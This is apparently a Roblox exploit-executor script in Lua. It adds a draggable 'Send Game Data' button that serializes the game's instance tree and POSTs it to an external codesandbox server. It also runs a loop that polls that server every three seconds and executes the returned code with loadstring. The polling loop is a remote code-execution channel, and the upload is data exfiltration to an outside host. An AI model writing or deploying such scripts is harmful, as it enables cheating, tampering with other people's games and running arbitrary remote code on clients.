local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")

local SERVER = "https://jn5t96-3000.csb.app"
local lastScriptHash = nil

-- Main Roblox services
local mainServices = {
	"Workspace", "Players", "Lighting", "ReplicatedStorage", "ReplicatedFirst",
	"ServerScriptService", "ServerStorage", "StarterGui", "StarterPack", "StarterPlayer",
	"SoundService", "Chat", "Teams", "LocalizationService", "TestService", "RunService",
	"ScriptContext", "HttpService"
}

-- Supported properties
local propertyNames = {
	"Name", "ClassName", "Position", "Orientation", "Rotation", "CFrame",
	"Size", "Anchored", "CanCollide", "Transparency", "BrickColor", "Material",
	"Color", "Reflectance", "TopSurface", "BottomSurface", "SurfaceType",
	"Text", "TextColor3", "TextSize", "Font", "Visible", "ZIndex",
	"Image", "ImageTransparency", "ImageColor3",
	"SoundId", "PlaybackSpeed", "Looped", "Playing", "Volume",
	"Health", "MaxHealth", "Team", "TeamColor",
	"CameraSubject", "CameraType", "FieldOfView",
	"BackgroundColor3", "BorderSizePixel", "BorderColor3", "TextStrokeColor3",
	"TextScaled", "TextWrapped", "TextXAlignment", "TextYAlignment",
	"AnchorPoint", "SizeConstraint", "LayoutOrder",
}

-- Convert to JSON-safe format
local function formatValue(val)
	local t = typeof(val)
	if t == "Color3" then
		return { r = val.R, g = val.G, b = val.B }
	elseif t == "Vector3" then
		return { x = val.X, y = val.Y, z = val.Z }
	elseif t == "BrickColor" or t == "EnumItem" then
		return tostring(val)
	elseif t == "CFrame" then
		return { x = val.X, y = val.Y, z = val.Z }
	elseif t == "UDim2" then
		return {
			xScale = val.X.Scale, xOffset = val.X.Offset,
			yScale = val.Y.Scale, yOffset = val.Y.Offset
		}
	elseif t == "boolean" or t == "number" or t == "string" then
		return val
	end
	return nil
end

local function getProperties(inst)
	local props = {}
	for _, prop in ipairs(propertyNames) do
		local ok, val = pcall(function()
			return inst[prop]
		end)
		if ok and val ~= nil then
			local safe = formatValue(val)
			if safe ~= nil then
				props[prop] = safe
			end
		end
	end
	return props
end

local function safeSerialize(inst)
	local props = getProperties(inst)
	props.Name = inst.Name
	props.ClassName = inst.ClassName
	props.Children = {}
	return props
end

-- Coroutine-based lightweight serializer
local function serializeSlowly(instances, onComplete)
	local tree = {
		Name = "game",
		ClassName = "DataModel",
		Children = {},
	}
	local queue = {}

	for _, service in ipairs(instances) do
		local node = safeSerialize(service)
		table.insert(tree.Children, node)
		table.insert(queue, { instance = service, node = node })
	end

	coroutine.wrap(function()
		while #queue > 0 do
			for _ = 1, 10 do
				local entry = table.remove(queue, 1)
				if not entry then break end
				local ok, children = pcall(function()
					return entry.instance:GetChildren()
				end)
				if ok then
					for _, child in ipairs(children) do
						local childNode = safeSerialize(child)
						table.insert(entry.node.Children, childNode)
						table.insert(queue, { instance = child, node = childNode })
					end
				end
			end
			task.wait()
		end
		onComplete(tree)
	end)()
end

-- Send to server manually
local function sendDex()
	local services = {}
	for _, name in ipairs(mainServices) do
		local ok, service = pcall(function()
			return game:GetService(name)
		end)
		if ok and service then
			table.insert(services, service)
		end
	end

	serializeSlowly(services, function(tree)
		local success, res = pcall(function()
			return request({
				Url = SERVER .. "/dex",
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode(tree)
			})
		end)
		if not success or not res.Success then
			warn("[Dex] Upload failed:", res and res.StatusMessage or "unknown")
		end
	end)
end

-- Script execution polling
local function checkScript()
	local success, res = pcall(function()
		return request({
			Url = SERVER .. "/latest",
			Method = "GET"
		})
	end)

	if success and res.Success then
		local content = res.Body
		local currentHash = HttpService:JSONEncode(content)
		if currentHash ~= lastScriptHash then
			lastScriptHash = currentHash
			local fn, err = loadstring(content)
			if fn then
				local ok, execErr = pcall(fn)
				if not ok then
					warn("[Script] Runtime error:", execErr)
				end
			else
				warn("[Script] Load error:", err)
			end
		end
	else
		warn("[Script] Failed to get latest.lua:", res.StatusMessage)
	end
end

-- Create movable GUI for Dex update
local function createGui()
	local gui = Instance.new("ScreenGui")
	gui.Name = "DexSendGui"
	gui.ResetOnSpawn = false
	gui.Parent = CoreGui

	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(0, 180, 0, 40)
	btn.Position = UDim2.new(0, 20, 0, 100)
	btn.Text = "Send Game Data"
	btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.BorderSizePixel = 0
	btn.Parent = gui
	btn.Active = true
	btn.Draggable = true

	-- Mobile drag support
	local dragging = false
	local offset
	btn.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			offset = input.Position - btn.AbsolutePosition
		end
	end)
	btn.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)
	btn.InputChanged:Connect(function(input)
		if dragging and input.UserInputType == Enum.UserInputType.Touch then
			local newPos = input.Position - offset
			btn.Position = UDim2.new(0, newPos.X, 0, newPos.Y)
		end
	end)

	btn.MouseButton1Click:Connect(sendDex)
end

-- Initialize
createGui()
task.spawn(function()
	while true do
		checkScript()
		task.wait(3)
	end
end)
